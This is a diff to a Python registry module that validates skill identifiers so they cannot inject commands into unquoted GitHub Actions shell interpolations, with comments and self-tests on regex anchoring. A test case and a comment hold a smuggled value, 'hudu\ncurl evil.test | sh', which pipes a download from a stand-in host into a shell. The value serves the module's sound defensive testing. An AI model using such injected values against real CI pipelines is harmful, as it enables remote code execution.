@@ -8,13 +8,25 @@ names) are introspected from each skill's vendored cli/ tree so they stay
 correct whether or not the source has been stripped of the -pp- brand.
 
 This module also owns the GRAMMAR for the identifiers it hands out (see
-`validate_registry`). Every one of them reaches a shell: release_matrix.py
-emits them into the ci.yml and release.yml build matrices, where they land in
-unquoted `${{ matrix.skill.* }}` interpolations. CI triggers on
-`pull_request`, so on a fork PR the FORK's tools/maintainer/skills.json is the
-input. Checking the grammar at load - the one door every reader comes through -
-makes those interpolations safe by construction, instead of quoting four call
-sites today and missing the fifth one somebody adds next month. See issue #251.
+`validate_registry`). The one that reaches a shell is the SLUG: release_matrix.py
+emits it into the ci.yml and release.yml build matrices as `name` and as `dir`
+(`skills/<slug>/cli`), and ci.yml interpolates both UNQUOTED - `cd ${{
+matrix.skill.dir }}` at two sites and `--slug ${{ matrix.skill.name }}` at four.
+`cli_binary` / `mcp_binary` travel the same matrix but land in `env:`
+assignments, and `source_dir` never reaches a workflow at all; their rules are
+filename and path-name hygiene rather than shell safety (see `_KIND_REACH`).
+CI triggers on `pull_request`, so on a fork PR the FORK's
+tools/maintainer/skills.json is the input. Checking the grammar in `load()`
+makes those interpolations safe by construction, instead of quoting six call
+sites today and missing the seventh one somebody adds next month. See issue #251.
+
+`load()` is the door every reader comes through, with exactly one named
+exception. `is_registered_slug.py` - the membership gate release.yml and
+mcp-publish.yml shell out to - and `verify_live.py`, which writes skills.json
+back, both read through `load()` and take SLUG_RE from here. The exception is
+`check_registry_state.py`: it diffs the working file against its `origin/main`
+baseline and must see the bytes as written, including a malformed entry `load()`
+would refuse, because reporting on that file is its whole job.
 
 Run the both-directions proof:
     python3 tools/maintainer/registry.py --self-test
@@ -88,10 +100,32 @@ def asset_map(cli_binary: str, mcp_binary: str) -> dict[str, dict[str, str]]:
 # false-RED the repo on the very first entry it met - see SOURCE_DIR_RE.
 # --------------------------------------------------------------------------
 
-# Every pattern below anchors with \Z, never `$`. In Python `$` also matches
-# immediately BEFORE a trailing newline, so `re.match(r"^[a-z0-9-]*$", "hudu\n")`
-# succeeds - and a slug carrying a newline is precisely the value that turns one
-# unquoted shell interpolation into two commands. \Z is the true end of string.
+# Every pattern below anchors with \Z, never `$`. `\Z` is the true end of the
+# string; Python's `$` also matches immediately BEFORE a single trailing
+# newline, so `re.match(r"^[a-z0-9][a-z0-9-]*$", "hudu\n")` SUCCEEDS while the
+# `\Z` form rejects it.
+#
+# Be precise about what that difference is worth, because the anchor is easy to
+# oversell. Measured against these character classes, `$` and `\Z` differ on
+# exactly one class of value: a slug ending in ONE newline. An EMBEDDED newline
+# ("hudu\ncurl evil.test | sh") is rejected by both - `[a-z0-9-]*` cannot match
+# a newline - so no attacker-chosen command can be smuggled through either
+# anchor. What "hudu\n" does reach is `cd ${{ matrix.skill.dir }}`, where
+# release_matrix.py's `skills/{slug}/cli` becomes two shell lines:
+#
+#     cd skills/hudu
+#     /cli
+#
+# i.e. `/cli: No such file or directory`, exit 1, under the `bash -e` GitHub
+# Actions uses for `run:`. That is a broken job, not command execution. So this
+# is defence in depth and a correctness fix - the grammar means "the whole value
+# is in the alphabet", and `$` quietly admits a value whose last character the
+# alphabet excludes - NOT a demonstrated injection. No exploit is claimed here
+# because none was demonstrated.
+#
+# The exposure this whole grammar closes is the larger one: before it, NOTHING
+# validated these identifiers, and CI runs on `pull_request`, so a fork PR's own
+# tools/maintainer/skills.json is the input to the matrix.
 
 # A published skill slug. Lowercase alphanumerics and internal hyphens only.
 # All 67 registered slugs satisfy this today.
@@ -120,15 +154,42 @@ _PATTERNS = {
 }
 
 
+# Where each identifier kind actually goes. Measured, not assumed: a maintainer
+# who trips one of these rules is owed the true reason, and only `slug` reaches
+# an unquoted shell interpolation.
+_KIND_REACH = {
+    "slug": (
+        "  `slug` is emitted by tools/maintainer/release_matrix.py into the GitHub Actions\n"
+        "  build matrix as `name` (and as `dir`, which is built as `skills/<slug>/cli`),\n"
+        "  where ci.yml interpolates it UNQUOTED into shell: `cd ${{ matrix.skill.dir }}`\n"
+        "  at two sites and `--slug ${{ matrix.skill.name }}` at four. A value outside the\n"
+        "  grammar is refused HERE rather than reaching a command line."
+    ),
+    "source_dir": (
+        "  `source_dir` never reaches a workflow: it is joined onto filesystem paths in\n"
+        "  Python (registry.skill_path, check_pinned_artifacts, check_marketplace_sync).\n"
+        "  The grammar keeps it a plain directory NAME - no path separator to walk out of\n"
+        "  skills/, no leading dot so `.` and `..` can never match, no whitespace."
+    ),
+    "cli_binary": (
+        "  `cli_binary` / `mcp_binary` become release asset FILENAMES via\n"
+        "  registry.asset_name(), travel the matrix, and are read by release.yml through\n"
+        "  `env:` (CLI_ASSET / MCP_ASSET) - an assignment, not a shell interpolation -\n"
+        "  then used as quoted shell variables and as install-script download URLs. The\n"
+        "  grammar keeps them well-formed filenames; it is not what stands between them\n"
+        "  and a shell."
+    ),
+}
+
+_KIND_REACH["mcp_binary"] = _KIND_REACH["cli_binary"]
+
+
 def _grammar_error(kind: str, slug: str, value: object) -> str:
     return (
         f"tools/maintainer/skills.json: {kind} {value!r}"
         + (f" (on skill '{slug}')" if kind != "slug" else "")
         + f" does not match {_PATTERNS[kind].pattern}.\n"
-        "  These identifiers are emitted by tools/maintainer/release_matrix.py into the\n"
-        "  GitHub Actions build matrix, where the workflows interpolate them into shell\n"
-        "  (`cd ${{ matrix.skill.dir }}`, `--slug ${{ matrix.skill.name }}`). A value\n"
-        "  outside the grammar is refused HERE rather than reaching a command line.\n"
+        + _KIND_REACH[kind] + "\n"
         "  Fix the entry in tools/maintainer/skills.json. See issue #251."
     )
 
@@ -290,16 +351,30 @@ def _self_test() -> int:
     expect_rejected("a cli_binary carrying a space",
                     {"skills": {"ok": {"cli_binary": "a b"}}}, "a b")
     expect_rejected("a non-string slug", {"skills": {"ok": {"source_dir": 7}}}, "7")
-    # The trailing-newline case: Python's `$` would accept this, and a newline
-    # inside an unquoted `${{ matrix.skill.name }}` is a second command.
-    expect_rejected("a slug with a trailing newline",
+    # An EMBEDDED newline is caught by the ALPHABET, not by the anchor:
+    # `[a-z0-9-]*` cannot match a newline, so `$` rejected this one too. Kept
+    # because it is a real malformation, and labelled honestly because on its
+    # own it proves nothing about the \Z change.
+    expect_rejected("a slug with an embedded newline (caught by the alphabet, not the anchor)",
                     {"skills": {"hudu\ncurl evil.test | sh": {}}}, "curl evil.test")
+
+    # THE anchor cases. A single TRAILING newline is the only value Python's `$`
+    # admits and `\Z` refuses, so these are the cases that discriminate - and
+    # the loop below proves they discriminate, by running the `$`-anchored twin
+    # of every shipped pattern against the same input and requiring it to
+    # ACCEPT. A case both anchors reject is a green light that measures nothing.
+    expect_rejected("a slug with a trailing newline",
+                    {"skills": {"hudu\n": {}}}, "hudu\\n")
     expect_rejected("a binary name with a trailing newline",
-                    {"skills": {"ok": {"mcp_binary": "hudu-mcp\nid"}}}, "hudu-mcp")
+                    {"skills": {"ok": {"mcp_binary": "hudu-mcp\n"}}}, "hudu-mcp\\n")
     for name, pattern in _PATTERNS.items():
         if pattern.match("safe\n"):
             failures.append(f"{name} pattern accepts a trailing newline; anchor it with "
                             f"\\Z, not $")
+        if not re.compile(pattern.pattern.replace(r"\Z", "$")).match("safe\n"):
+            failures.append(f"{name}: the `$`-anchored twin of this pattern was expected to "
+                            f"ACCEPT 'safe\\n'. If it does not, the trailing-newline cases "
+                            f"above are non-discriminating and prove nothing about the anchor.")
 
     if failures:
         print("FAIL: registry grammar self-test\n")
